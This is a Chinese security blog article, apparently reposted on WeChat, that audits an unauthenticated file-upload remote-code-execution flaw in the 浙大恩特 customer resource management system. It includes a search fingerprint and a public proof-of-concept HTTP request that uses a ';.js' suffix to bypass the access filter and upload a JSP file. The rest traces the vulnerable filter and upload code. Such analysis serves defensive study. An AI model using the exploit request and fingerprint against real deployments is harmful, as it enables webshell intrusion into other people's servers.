---
title: 浙大恩特前台RCE漏洞审计
url: https://mp.weixin.qq.com/s/JRi9d06oTopuaKKTNhko-w
source: Doonsec's feed
date: 2026-07-01
fetch_date: 2026-07-02T05:54:53.244845
---

# 浙大恩特前台RCE漏洞审计

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/lFfjZayicKlEdykWKE5uAGLtBPtfQRgVtN30Lug1JcUtnmg4RvI3AIWzJoRibPYwvS7zE1mxM3g3uiciaVKz1ThVoxmwDTUmnNBLQkIcWia86ibP0/0?wx_fmt=jpeg)

# 浙大恩特前台RCE漏洞审计

蚁景网安

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

以下文章来源于蚁景网络安全
，作者大白

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM7Yk0SeU4ibQcLl1mDLlqhbAOdK1Ik3EO85soOvkh9e8wQ/0)

**蚁景网络安全**
.

致力于为你带来更实用的网络安全技术内容！

技术文章仅供参考学习，请勿使用本文中所提供的任何技术信息或代码工具进行非法测试和违法行为。

指纹：title="欢迎使用浙大恩特客户资源管理系统"

本文对该系统公开在互联网，但未分析代码细节的漏洞进行审计分析：

**前台文件上传RCE**

该系统2019版本存在权限绕过加文件上传组合漏洞，可通过上传webshell实现前台RCE。

公开POC：

```
POST /entsoft/CustomerAction.entphone;.js?method=loadFile HTTP/1.1Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0)
Gecko/20100101 Firefox/112.0 uacqAccept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language:
zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding:
gzip, deflateConnection: closeContent-Type: multipart/form-data;
boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2AContent-Length: 203

------WebKitFormBoundarye8FPHsIAq9JN8j2AContent-Disposition:
form-data; name="file";filename="as.jsp"Content-Type: image/jpeg

<%out.print("test");%>------WebKitFormBoundarye8FPHsIAq9JN8j2A--
```

权限绕过部分先看过滤器：

![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldya5mGPtWUHJ50jv0a1azC4aAoUJEgUIJhk06lKn4be8J51oRbWTRJHxOYp4uVV5nfiblL5unVgv0Q/640?wx_fmt=png&from=appmsg "null")

分析web.xml发现purfilter为全局过滤器：

![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldya5mGPtWUHJ50jv0a1azC4yb8tMxe1z7cpEwuKaRZcVb37rleVmiaZHDxAbAcGDDrice3O3NL5NIyw/640?wx_fmt=png&from=appmsg "null")

如上，会对/\*也就是任意请求进行拦截，跟进源码：

![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldya5mGPtWUHJ50jv0a1azC4g9bYUHTr1Xqm6wGc1DwXtV8Xuq0BhR0rXpLzLbM688nQa5OzRJW3XQ/640?wx_fmt=png&from=appmsg "null")

首先出现的就是白名单后缀+白名单接口，在后续校验中也是对非listExpUrl内容的后缀或者接口才会进行权限校验：

![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldya5mGPtWUHJ50jv0a1azC4ndibdjwV5bbao1Y0mc1ibZm1zjzGKOuC4Aqk8YVRicr0UA4aQtAP2x1jA/640?wx_fmt=png&from=appmsg "null")而拦截器在进行后缀白名单检测时，获取后缀的方式如下：![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldya5mGPtWUHJ50jv0a1azC4KlAYbvutQlKkicwJjRQeVeVHCwyNJupFjJ7e6LF0e1XpAFQNpb0p6XQ/640?wx_fmt=png&from=appmsg "null")

通过获取最后一个.的部分作为后缀。

而且该系统是tomcat容器，基于该容器对;的解析特性，不会匹配到;后面的内容，也就是在进行路由匹配时，只会匹配到CustomerAction.entphone，从而使得CustomerAction.entphone;.js?method=loadFile顺利进入过滤器层面的校验，并且此时获取的后缀又是.js，处于白名单后缀，从而实现权限绕过。

![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldya5mGPtWUHJ50jv0a1azC4L7gJiaXvYAdFtp7vUU0y1yJqMpZ4zSNEHsicWdKWnEd0mgqNoVibQnibLA/640?wx_fmt=png&from=appmsg "null")

接下来分析：上传点代码漏洞原因：

![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldya5mGPtWUHJ50jv0a1azC4La12GyHhgVGQc96ceGluj97CfIWaDpwptkUOiaIickSiaT0Jmcl4Rsj0g/640?wx_fmt=png&from=appmsg "null")

先在xml文件寻找接口对应后端代码，该接口匹配后缀.entphone，对应代码为：enterphone.EntPhoneControl类。

全局搜索EntPhoneControl类：

![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldya5mGPtWUHJ50jv0a1azC4rr3cTg2aphQrs22XzOYe4Z3icmefJR1ia4tGzkGkXBp2UcuibnvDchEHw/640?wx_fmt=png&from=appmsg "null")

跟进漏洞类CustomerAction：

![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldya5mGPtWUHJ50jv0a1azC44APENOibiaPGvia94O2AxMFBLfSN15nk2APq1vEfviaiayxuyRUEBLmnyug/640?wx_fmt=png&from=appmsg "null")

跟进method对应loadFile方法：

![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldya5mGPtWUHJ50jv0a1azC4h35kvXdvzicKOwEibA46SGQnnnXickmkHvDAo7hwSgUrqYkRQZCEVnmrg/640?wx_fmt=png&from=appmsg "null")

要想进入文件上传逻辑，会先进行gesum参数的条件判断：

![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldya5mGPtWUHJ50jv0a1azC4yPRRnU9O2bjpYwF66VAO7VMb5McwWBG0pEhHxoboKjbGOwSzRt22xQ/640?wx_fmt=png&from=appmsg "null")

在gesum不为空时才进入上传逻辑，原数据包里面是没有传gesum参数的，在java里面，一般值会设置为NULL，而NULL不等于空，则能够顺利进入if逻辑。

进入if块后，代码会继续执行以下步骤：

创建CustomerBean并设置gesnum（此时gesnum为null）和tenantID。

调用customerBean.checkGesnum()检查客户代码是否存在。

这一步是关键：若checkGesnum()方法在gesnum为null时返回false（即认为
"客户代码不存在"，符合业务逻辑，因为null通常不是有效的客户代码），则会进入else分支，执行文件上传逻辑。

![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldya5mGPtWUHJ50jv0a1azC4ia62bcsd4I6Ojna8X59XpvrY3oMe9nwcTtibRWHyrxnZZeHv8icibNb0kA/640?wx_fmt=png&from=appmsg "null")

随后通过如上文件获取文件名，并直接进行文件上传，由于未进行后缀校验，从而可上传jsp文件，造成RCE漏洞。

本地环境漏洞复现：

![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldya5mGPtWUHJ50jv0a1azC4URXMEA1CsDYeOrvkHZvLlSib9EWyJUtdfEHN9jnAu3Wls1wZeN5dLLA/640?wx_fmt=png&from=appmsg "null")

上传成功，并成功解析：

![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldya5mGPtWUHJ50jv0a1azC4HP6CamcKAAOoiaRvGfzZMDF2PC9PRWJGAbDUgtia6iaMOADkPlwmKXgCw/640?wx_fmt=png&from=appmsg "null")

![图片](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibgSm6mrFp1ZjAg4ITRicicuLN88YodIuqtF4DcUs9sruBa0bFLtX59lQQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=10)

学习网安实战技术，戳“阅读原文”

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/TL4Y9UAcgruasR1ULCzS2icYoNn4Yz5aKdDv4u2Z8JA7ru620vsrtZjDIFMQzJFyicnn9YgOQQtbfraAJvNbwvAA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过